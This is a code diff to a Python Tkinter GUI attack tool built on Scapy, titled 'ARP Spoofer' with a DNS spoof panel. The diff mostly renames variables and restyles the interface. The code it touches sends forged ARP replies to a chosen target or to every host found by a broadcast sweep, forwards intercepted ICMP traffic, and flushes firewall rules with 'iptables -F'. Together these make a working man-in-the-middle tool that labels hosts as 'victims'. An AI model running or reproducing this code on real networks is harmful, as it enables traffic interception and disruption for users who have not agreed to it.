@@ -22,10 +22,10 @@ from PIL import Image, ImageTk
 
 # ------------------------------------- MAIN ---------------------------------------------
 # --------------------------------- Global param -----------------------------------------
-routeur_ip=conf.route.route("0.0.0.0")[2] 
+router_ip=conf.route.route("0.0.0.0")[2] 
 iface1=conf.iface
-x = sr1(ARP(pdst=routeur_ip), iface=iface1, timeout=2) 
-routeur_mac=x.hwsrc
+x = sr1(ARP(pdst=router_ip), iface=iface1, timeout=2) 
+router_mac=x.hwsrc
 
 # Frame
 class dreamteam(tk.Tk):
@@ -103,11 +103,11 @@ class ARP_one(Frame):
 
 			x = sr1(ARP(pdst=victim_ip), iface=iface, timeout=2) 
 			victim_mac = x.hwsrc
-			x = sr1(ARP(pdst=routeur_ip), iface=iface, timeout=2)
-			routeur_mac = x.hwsrc
+			x = sr1(ARP(pdst=router_ip), iface=iface, timeout=2)
+			router_mac = x.hwsrc
 
 			self.text_box.insert("end-1c", "\n [!] Restoring the victim's network [!]\n")
-			send(ARP(pdst=victim_ip, hwdst=victim_mac, psrc=routeur_ip, hwsrc=routeur_mac, op=2), count=5, inter=.2)
+			send(ARP(pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=router_mac, op=2), count=5, inter=.2)
 			os.system("iptables -F")
 			app.destroy()
 		
@@ -146,7 +146,7 @@ class ARP_one(Frame):
 		def single():
 			# Green light
 			canvas1.itemconfig("smile", image=img2)
-			#sniff(filter="arp and host " + routeur_ip, prn=arp_sniffing1)
+			#sniff(filter="arp and host " + router_ip, prn=arp_sniffing1)
 			sniff(prn=general_sniffing1)
             
 		def arp_spoof1():
@@ -154,8 +154,8 @@ class ARP_one(Frame):
 			victim_ip=self.saisie_vic.get() # get victim ip
 			self.victim_ip = victim_ip
 			ethernet = Ether()
-			arp = ARP(pdst=victim_ip, psrc=routeur_ip, op="is-at")
-			arp1 = ARP(pdst=routeur_ip, psrc=victim_ip, op="is-at")
+			arp = ARP(pdst=victim_ip, psrc=router_ip, op="is-at")
+			arp1 = ARP(pdst=router_ip, psrc=victim_ip, op="is-at")
 			packet = ethernet / arp
 			packet1 = ethernet / arp1
 			sendp(packet, iface=iface)
@@ -175,9 +175,9 @@ class ARP_one(Frame):
 		def general_sniffing1(pkt):
 			iface=self.saisie_if.get()
 			victim_ip=self.saisie_vic.get()
-			routeur_ip=conf.route.route("0.0.0.0")[2]
-			x = sr1(ARP(pdst=routeur_ip), iface=iface, timeout=2)
-			routeur_mac = x.hwsrc
+			router_ip=conf.route.route("0.0.0.0")[2]
+			x = sr1(ARP(pdst=router_ip), iface=iface, timeout=2)
+			router_mac = x.hwsrc
 			x = sr1(ARP(pdst=victim_ip), iface=iface, timeout=2) 
 			victim_mac = x.hwsrc
 			me_ip = get_if_addr(iface)
@@ -187,7 +187,7 @@ class ARP_one(Frame):
 					arp_sniffing1(pkt)
 					
 			elif pkt.haslayer(ICMP) and pkt.haslayer(Ether) and pkt.haslayer(IP):
-				if pkt[IP].dst in (routeur_ip, victim_ip):
+				if pkt[IP].dst in (router_ip, victim_ip):
 					if pkt[Ether].dst == me_mac:
 						self.text_box.insert("end-1c","REDIRECTING ICMP\n")
 						
@@ -197,7 +197,7 @@ class ARP_one(Frame):
 						canvas.delete(self.arrow)
 						
 						#pkt.show()
-						pkt[Ether].dst = victim_mac if pkt[IP].dst == victim_ip else routeur_mac
+						pkt[Ether].dst = victim_mac if pkt[IP].dst == victim_ip else router_mac
 						pkt[Ether].src = me_mac
 						sendp(pkt, iface=iface)
 					
@@ -217,14 +217,14 @@ class ARP_one(Frame):
             
             
 		Frame.__init__(self, master)
-		self.multiuser = Button(self, text="►All the network◄", command=lambda: master.switch_frame(ARP_all),bg='#ae3333')
+		self.multiuser = Button(self, text="►All the network◄", command=lambda: master.switch_frame(ARP_all),bg='#ae3333', cursor="hand2")
 		self.label_if = Label(self, text="ARP Spoofer | One Target", font = ( "Calibri" , 20 ), bg='#ae3333', pady=30, padx=128, width = 45)
 		self.label_if.pack()
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 
 		# IFACE
-		self.label_if = Label(self, text="INTERFACE", font = ( "Calibri" , 11 ), bg='#ae3333')
+		self.label_if = Label(self, text="INTERFACE", font = ( "Calibri" , 11, "bold" ), bg='#ae3333')
 		self.label_if.pack()
 		self.saisie_if = Entry(self, width=20, cursor="dotbox")
 		self.saisie_if.pack()
@@ -234,9 +234,9 @@ class ARP_one(Frame):
 		self.label.pack()
 
 		# VICTIM IP
-		self.label_vic = Label(self, text="TARGET @IP", font = ( "Calibri" , 11 ), bg='#ae3333')
+		self.label_vic = Label(self, text="TARGET @IP", font = ( "Calibri" , 11, "bold" ), bg='#ae3333')
 		self.label_vic.pack()
-		self.saisie_vic = Entry(self, width=20, cursor="spider")
+		self.saisie_vic = Entry(self, width=20, cursor="dotbox")
 		self.saisie_vic.pack()
 
 
@@ -251,9 +251,9 @@ class ARP_one(Frame):
 		
 
 		# TEXT BOX DETAILS
-		self.dt = Label(self, text="Details", font = ( "Calibri" , 11 ), bg='#ae3333')
+		self.dt = Label(self, text="Details", font = ( "Calibri" , 11, "italic" ), bg='#ae3333')
 		self.dt.pack()
-		self.text_box = tk.Text(self, width = 40, height = 7)
+		self.text_box = tk.Text(self, width = 40, height = 7, cursor="pirate")
 		self.text_box.pack()
 
 		self.label= Label(self, text="", bg="black")
@@ -261,8 +261,8 @@ class ARP_one(Frame):
 
 		# BUTTONS AND OTHERS
 
-		self.b_start=Button(self, image=start_btn, command = threading1)
-		self.b_stop=Button(self, image=stop_btn, command=threading2) 
+		self.b_start=Button(self, image=start_btn, cursor="hand2", command = threading1)
+		self.b_stop=Button(self, image=stop_btn, cursor="hand2", command=threading2) 
 		self.b_start.image=start_btn
 		self.b_stop.image=stop_btn
 		self.b_start.pack()
@@ -308,15 +308,16 @@ class ARP_all(Frame):
         	# Close application + restore network
 		def signal_handler_all():
 			canvas1.itemconfig("smile", image=img1)
-			victim_ip=self.saisie_ip.get()
+			#victim_ip=self.saisie_ip.get()
+			# send to the broadcast
+			victim="255.255.255.255"
 
-			x = sr1(ARP(pdst=routeur_ip), iface=iface1, timeout=2)
-			routeur_mac = x.hwsrc
-
-			#print('\n [!] Restoring victim network')
-			send(ARP(pdst=victim_ip, psrc=routeur_ip, hwsrc=routeur_mac, op=2), count=5, inter=.2)
-			os.system("iptables -F")
+			x = sr1(ARP(pdst=router_ip), iface=iface1, timeout=2)
+			router_mac = x.hwsrc
 			app.destroy()
+			send(ARP(pdst=victim, psrc=router_ip, hwsrc=router_mac, op=2), count=5, inter=.2)
+			os.system("iptables -F")
+			
 			
 		# ARP all launch
 		def threading2():
@@ -329,7 +330,7 @@ class ARP_all(Frame):
 				arp_spoof2()
 		
 		def arp_all():
-			sniff(filter="arp and host "+routeur_ip, prn=arp_sniffing2)
+			sniff(filter="arp and host "+router_ip, prn=arp_sniffing2)
 			
 		def arp_spoof2(): 
 			# Green light
@@ -340,29 +341,30 @@ class ARP_all(Frame):
 			arp = ARP(pdst=victim_ip)
 			
 			# Create Broadcast Ether ether
-			# ff:ff:ff:ff:ff:ff broadcast (MAC addr)
+			# ff:ff:ff:ff:ff:ff is broadcast (MAC addr)
 			ether = Ether(dst="ff:ff:ff:ff:ff:ff")
 			
 			packet = ether/arp
 			result = srp(packet, timeout=3, verbose=0)[0]
 			
-			victimes = []
-			gui_victimes = []
+			# make a list of victims
+			victims = []
+			gui_victims = []
 			# Get all IP and MAC address of the network + spoof them
 			for sent, received in result:
 			# For each answer, we add IP and MAC address to `victims` and 'gui_victims' lists
-				victimes.append({'ip': received.psrc, 'mac': received.hwsrc})
-				gui_victimes.append(received.psrc)
+				victims.append({'ip': received.psrc, 'mac': received.hwsrc})
+				gui_victims.append(received.psrc)
 				
 			# Display all network victims
 			self.text_box.insert("end-1c", "\nCONNECTED MACHINES\n")
 			self.text_box.insert("end-1c", "IP" + " "*18+"MAC\n")
-			for x in victimes:
+			for x in victims:
 				self.text_box.insert("end-1c", "{:16}    {}\n".format(x['ip'], x['mac']))
 				
-			# GUI VICTIMES ANIMATION
-			a = 10
-			b = 10
+			# GUI VICTIMS ANIMATION
+			a = 110
+			b = 110
 			
 			canvas = self.canvas
 			gui_pc = self.gui_pc
@@ -375,40 +377,55 @@ class ARP_all(Frame):
 			self.items = []
 			self.texts = []
 
-			for y in gui_victimes:
+			for y in gui_victims:
 				print (y)
-				
-				item=canvas.create_image((a, 10), anchor=NW, image=gui_pc, tag="gui_vic")
-				canvas.itemconfig("gui_vic", image=gui_pc)
-				text=canvas.create_text((b, 65), anchor=NW, font=("Calibri", 7), text=y, tag="gui_ip", fill="red")
-				canvas.itemconfig("gui_ip")
-				self.items.append(item)
-				self.texts.append(text)
+				if y == router_ip:
+					item=canvas.create_image((10, 10), anchor=NW, image=router, tag="router")
+					canvas.itemconfig("router", image=router)
+					text=canvas.create_text((10, 65), anchor=NW, font=("Calibri", 7), text=y, tag="router_ip", fill="red")
+					canvas.itemconfig("router_ip")
+					self.items.append(item)
+					self.texts.append(text)
+				else:
+					item=canvas.create_image((a, 10), anchor=NW, image=gui_pc, tag="gui_vic")
+					canvas.itemconfig("gui_vic", image=gui_pc)
+					text=canvas.create_text((b, 65), anchor=NW, font=("Calibri", 7), text=y, tag="gui_ip", fill="red")
+					canvas.itemconfig("gui_ip")
+					self.items.append(item)
+					self.texts.append(text)
+					a += 100
+					b += 100
 
 				text=0
 				item=0
-				a += 100
-				b += 100
+				
 				
 			time.sleep(1)
 			canvas.update()
 			canvas.pack()
 				
 			ethernet = Ether()
-			for x in victimes:
-				if x['ip']==routeur_ip: # Deleting router IP address because we don't want to send it any ARP packet
+			a-=75
+			for x in victims:
+				if x['ip']==router_ip: # Deleting router IP address because we don't want to send it any ARP packet
 					del x['ip']
 				else:
-					arp = ARP(pdst=x['ip'], psrc=routeur_ip, op="is-at")
+					arp = ARP(pdst=x['ip'], psrc=router_ip, op="is-at")
 					packet = ethernet / arp
-					sendp(packet, iface=iface1) # change iface !
-					self.text_box.insert("end-1c","[+]ARP Spoof to ( {0} )\n".format(x['ip']))
+					sendp(packet, iface=iface1) 
+					self.text_box.insert("end-1c","[+] ARP Spoof to ( {0} )\n".format(x['ip']))
+					self.arrow=canvas.create_line(a,130,a,80, arrow=tk.LAST, fill="yellow", width="5")
+					time.sleep(0.4)
+					canvas.delete(self.arrow)
+					a-=100
+					
+					
   
 		Frame.__init__(self, master)
 		
 		self.items = []
 		self.texts = []
-		self.singleuser = Button(self, text="►Single user◄", command=lambda: master.switch_frame(ARP_one), bg="#ae3333")
+		self.singleuser = Button(self, text="►Single user◄", command=lambda: master.switch_frame(ARP_one), bg="#ae3333", cursor="hand2")
 		self.label_if = Label(self, text="ARP Spoofer | All Network", font = ( "Calibri" , 20 ), bg='#ae3333', pady=30, padx=128, width=45)
 		self.label_if.pack()
 		
@@ -419,23 +436,23 @@ class ARP_all(Frame):
 		self.label.pack()
 		
 		# IFACE
-		self.label_ip = Label(self, text="NETWORK @IP", font = ( "Calibri" , 11 ), bg='#ae3333')
+		self.label_ip = Label(self, text="NETWORK @IP", font = ( "Calibri" , 11, "bold" ), bg='#ae3333')
 		self.label_ip.pack()
 		self.saisie_ip = Entry(self, width=20, cursor="dotbox")
 		self.saisie_ip.pack()
+		self.example = Label(self, text="(EX : 192.168.1.0/24)", font = ( "Calibri" , 7, "italic"), bg='#ae3333')
+		self.example.pack()
 		
 		# SPACES
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
-		self.label= Label(self, text="", bg="black")
-		self.label.pack()
 		
 		# TEXTBOX DETAILS
-		self.dt = Label(self, text="Details", font = ( "Calibri" , 11 ), bg='#ae3333')
+		self.dt = Label(self, text="Details", font = ( "Calibri" , 11, "italic"), bg='#ae3333')
 		self.dt.pack()
-		self.text_box = tk.Text(self, width = 40, height = 7)
+		self.text_box = tk.Text(self, width = 40, height = 7, cursor="pirate")
 		self.text_box.pack()
 		
 		# SPACES
@@ -446,8 +463,8 @@ class ARP_all(Frame):
 		stop_btn = ImageTk.PhotoImage(Image.open("../images/stop.png"))
 		
 		# BUTTONS
-		self.b_start2=Button(self, image=start_btn, command = threading2)
-		self.b_stop2=Button(self, image=stop_btn, command=signal_handler_all) 
+		self.b_start2=Button(self, image=start_btn, cursor="hand2", command = threading2)
+		self.b_stop2=Button(self, image=stop_btn, cursor="hand2", command=signal_handler_all) 
 		self.b_start2.image=start_btn
 		self.b_stop2.image=stop_btn
 		self.b_start2.pack()
@@ -467,9 +484,15 @@ class ARP_all(Frame):
 		canvas1.pack()
 		canvas1.create_image((50, 50), image=img1, tag="smile")
 		self.configure(bg="black")
-
+		
+		self.anim = Label(self, text="|CONNECTED DEVICES|", font = ( "Calibri" , 12 ), bg='#ae3333', width = 50)
+		self.anim.pack()
+		self.label= Label(self, text="", bg="black")
+		self.label.pack()
 		# GUI VICTIM
 		gui_pc = ImageTk.PhotoImage(Image.open("../images/victim2.png"))
+		router = ImageTk.PhotoImage(Image.open("../images/router.png"))
+		spoof = ImageTk.PhotoImage(Image.open("../images/spoof.png"))
 		canvas = tk.Canvas(self, width=900, height=200, bg="black", highlightthickness=0)
 		self.gui_pc = gui_pc
 		self.canvas = canvas
@@ -608,7 +631,7 @@ class DNS_attk(Frame):
 		self.label.pack()
 
 		# DNS NAME INPUT
-		self.label_dnsname = Label(self, text="DNS NAME", font = ( "Calibri" , 11 ), bg='#16537e')
+		self.label_dnsname = Label(self, text="DNS NAME", font = ( "Calibri" , 11, "bold" ), bg='#16537e')
 		self.label_dnsname.pack()
 		self.saisie_dnsname = Entry(self, width=20, cursor="dotbox")
 		self.saisie_dnsname.pack()
@@ -618,9 +641,9 @@ class DNS_attk(Frame):
 		self.label.pack()
 
 		# DNS IP INPUT
-		self.label_dnsip = Label(self, text="DNS @IP ", font = ( "Calibri" , 11 ), bg='#16537e')
+		self.label_dnsip = Label(self, text="DNS @IP ", font = ( "Calibri" , 11, "bold"), bg='#16537e')
 		self.label_dnsip.pack()
-		self.saisie_dnsip = Entry(self, width=20, cursor="spider")
+		self.saisie_dnsip = Entry(self, width=20, cursor="dotbox")
 		self.saisie_dnsip.pack()
 
 		# SPACES
@@ -630,9 +653,9 @@ class DNS_attk(Frame):
 		self.label.pack()
 
 		# TEXTBOX DETAILS
-		self.dt = Label(self, text="Details", font = ( "Calibri" , 11 ), bg='#16537e')
+		self.dt = Label(self, text="Details", font = ( "Calibri" , 11 , "italic"), bg='#16537e')
 		self.dt.pack()
-		self.text_box = tk.Text(self, width = 40, height = 7)
+		self.text_box = tk.Text(self, width = 40, height = 7, cursor="pirate")
 		self.text_box.pack()
 
 		# SPACES
@@ -643,8 +666,8 @@ class DNS_attk(Frame):
 		self.label.pack()
 
 		# BUTTONS
-		self.b_start2 = Button(self, text="Start", bg = "green" , fg = "black" , command = threading_dns )
-		self.b_stop2=Button(self, text="Stop", bg = "red" , fg = "black" , command = dns_kill)
+		self.b_start2 = Button(self, text="Start", bg = "green" , fg = "black" , cursor="hand2", command = threading_dns )
+		self.b_stop2=Button(self, text="Stop", bg = "red" , fg = "black" , cursor="hand2", command = dns_kill)
 		self.b_start2.pack()
 
 		# SPACES
@@ -691,14 +714,14 @@ class about_nc(Frame):
 		self.canvas_a = tk.Canvas(self, width=160, height=160, bg="black", highlightthickness=0)
 		self.canvas_a.pack()
 		self.logo = ImageTk.PhotoImage(Image.open('../images/logo.png'))
-		self.canvas_a.create_image(160,160,image=self.logo,anchor='se') 
+		self.canvas_a.create_image(150,150,image=self.logo,anchor='se') 
 
 		# SPACES
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 
 		# HELP text
-		self.dt = Label(self, text="Here are some help to get to know our tool : ", font = ( "Calibri" , 13 ), bg='#ae3333')
+		self.dt = Label(self, text="HELP", font = ( "Calibri" , 12, "bold" ), bg='#ae3333')
 		self.dt.pack()
 
 		# SPACES 
@@ -710,11 +733,11 @@ class about_nc(Frame):
 		self.label= Label(self, text="", bg="black")
 		self.label.pack()
 
-		self.canvas_a = tk.Canvas(self, width=400, height=150, bg="black", highlightthickness=0)
+		self.canvas_a = tk.Canvas(self, width=400, height=230, bg="black", highlightthickness=0)
 		self.canvas_a.pack()
 
 		# SPOOF ARROW
-		self.spoof=self.canvas_a.create_text(100,35, text="SPOOF", font = ( "Calibri" , 9  ), fill="green")
+		self.spoof=self.canvas_a.create_text(100,35, text="Spoofing", font = ( "Calibri" , 9  ), fill="green")
 		self.spoof=self.canvas_a.create_line(50,20,170,20, arrow=tk.LAST, fill="green", width="7")
 
 		# ICMP ARROW
@@ -724,8 +747,15 @@ class about_nc(Frame):
 		# CROSS
 		self.icmp=self.canvas_a.create_text(200,90, text="Not redirecting", font = ( "Calibri" , 9  ), fill="red")
 		self.cross=self.canvas_a.create_text(200,60, text="X", font = ( "Calibri" , 30  ), fill="red")
-
-
+		
+		self.all=self.canvas_a.create_text(200,120, text="ARP ALL Network", font = ( "Calibri" , 11, "bold"  ), fill="white")
+		self.arp=self.canvas_a.create_text(200,220, text="Spoofing", font = ( "Calibri" , 9  ), fill="yellow")
+		self.arrow=self.canvas_a.create_line(200,200,200,140, arrow=tk.LAST, fill="yellow", width="5")
+		
+		self.label= Label(self, text="", bg="black")
+		self.label.pack()
+		self.label= Label(self, text="", bg="black")
+		self.label.pack()
 		self.dt = Label(self, text="                DNS SPOOF                ", font = ( "Calibri" , 12 ), bg='white')
 		self.dt.pack()
 		self.label= Label(self, text="", bg="black")
@@ -743,8 +773,6 @@ class about_nc(Frame):
 		self.arrow=self.canvas_b.create_line(355,20,235,20, arrow=tk.LAST, fill="#99aaff", width="7")
 
 
-		self.label= Label(self, text="", bg="black")
-		self.label.pack()
 		self.dt = Label(self, text="Copyright ( © ) 2021 KL \n This program comes with ABSOLUTELY NO WARRANTY ! \n It is a free software, and you are welcome to redistribute it under certain conditions. ", font = ( "Calibri" , 10 ), bg='#ae3333')
 		self.dt.pack()
 
